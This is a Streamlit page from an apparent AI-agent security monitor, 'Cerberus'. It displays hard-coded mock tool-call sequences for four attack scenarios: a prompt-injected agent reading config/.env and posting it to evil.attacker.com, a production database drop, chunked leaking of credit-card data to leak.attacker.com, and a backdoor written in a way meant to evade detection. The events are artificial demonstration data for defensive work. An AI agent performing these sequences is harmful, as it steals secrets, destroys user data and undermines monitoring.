import streamlit as st

from cerberus.narrative.reconstructor import NarrativeReconstructor
from cerberus.proxy.models import EventDecision, ToolCallEvent

st.header("📖 Incident Narrative & Attack Story Reconstruction")
st.markdown("""
Cerberus transforms raw, disjointed tool execution logs into human-readable attack chains.
Security analysts can immediately inspect the **Reconnaissance**, **Staging**, and **Exfiltration** phases.
""")

attack_choice = st.selectbox(
    "Select Attack Scenario to Reconstruct:",
    [
        "Toxic Flow: Prompt Injection -> Data Exfiltration",
        "Privilege Escalation: Database Admin Hijack",
        "Slow-Drip Exfiltration: Fragmented Leak",
        "Markov Mimicry: Structural Camouflage Attempt",
    ],
)

if "Toxic Flow" in attack_choice:
    events = [
        ToolCallEvent(
            session_id="sess-c44d",
            agent_id="coding-01",
            tool_name="read_public_issue",
            tool_server="file-server",
            parameters={"issue_id": 42},
            risk_score=0.10,
            decision=EventDecision.ALLOW,
        ),
        ToolCallEvent(
            session_id="sess-c44d",
            agent_id="coding-01",
            tool_name="read_private_repo",
            tool_server="file-server",
            parameters={"path": "config/.env"},
            response_size_bytes=3400,
            risk_score=0.45,
            decision=EventDecision.FLAG,
        ),
        ToolCallEvent(
            session_id="sess-c44d",
            agent_id="coding-01",
            tool_name="http_post",
            tool_server="webhook-server",
            parameters={"url": "https://evil.attacker.com/leak", "data": "[REDACTED]"},
            destination_domain="evil.attacker.com",
            risk_score=0.96,
            decision=EventDecision.QUARANTINE,
        ),
    ]
elif "Privilege" in attack_choice:
    events = [
        ToolCallEvent(
            session_id="sess-priv-01",
            agent_id="support-01",
            tool_name="search_tickets",
            tool_server="db-server",
            parameters={"query": "refund"},
            risk_score=0.08,
            decision=EventDecision.ALLOW,
        ),
        ToolCallEvent(
            session_id="sess-priv-01",
            agent_id="support-01",
            tool_name="admin_drop_database",
            tool_server="db-server",
            parameters={"target": "production_users"},
            risk_score=0.92,
            decision=EventDecision.QUARANTINE,
        ),
    ]
elif "Slow-Drip" in attack_choice:
    events = [
        ToolCallEvent(
            session_id="sess-drip-01",
            agent_id="data-01",
            tool_name="query_db",
            tool_server="db-server",
            parameters={"sql": "SELECT credit_card FROM payments LIMIT 10"},
            risk_score=0.35,
            decision=EventDecision.ALLOW,
        ),
        ToolCallEvent(
            session_id="sess-drip-01",
            agent_id="data-01",
            tool_name="http_post",
            tool_server="webhook-server",
            parameters={"dest": "leak.attacker.com", "chunk": "part_1"},
            destination_domain="leak.attacker.com",
            risk_score=0.20,
            decision=EventDecision.ALLOW,
        ),
        ToolCallEvent(
            session_id="sess-drip-01",
            agent_id="data-01",
            tool_name="http_post",
            tool_server="webhook-server",
            parameters={"dest": "leak.attacker.com", "chunk": "part_10"},
            destination_domain="leak.attacker.com",
            risk_score=0.75,
            decision=EventDecision.BLOCK,
        ),
    ]
else:
    events = [
        ToolCallEvent(
            session_id="sess-mimic-01",
            agent_id="coding-01",
            tool_name="read_file",
            tool_server="file-server",
            parameters={"path": "src/main.py"},
            risk_score=0.05,
            decision=EventDecision.ALLOW,
        ),
        ToolCallEvent(
            session_id="sess-mimic-01",
            agent_id="coding-01",
            tool_name="write_file",
            tool_server="file-server",
            parameters={"path": "src/main.py", "backdoor": True},
            risk_score=0.18,
            decision=EventDecision.ALLOW,
        ),
        ToolCallEvent(
            session_id="sess-mimic-01",
            agent_id="coding-01",
            tool_name="run_tests",
            tool_server="file-server",
            parameters={"filter": "test_auth"},
            risk_score=0.24,
            decision=EventDecision.ALLOW,
        ),
    ]

narrative = NarrativeReconstructor.reconstruct(events)
st.code(narrative, language="markdown")

st.subheader("Incident Timeline Breakdown")
c1, c2, c3 = st.columns(3)
with c1:
    st.info(
        "**Phase 1: Reconnaissance**\n\nAttacker enumerates environment and probes entry points."
    )
with c2:
    st.warning(
        "**Phase 2: Staging**\n\nSensitive data files or database tables are queried and staged."
    )
with c3:
    st.error(
        "**Phase 3: Exfiltration / Action**\n\nOutbound egress initiated; intercepted by Cerberus policy gate."
    )
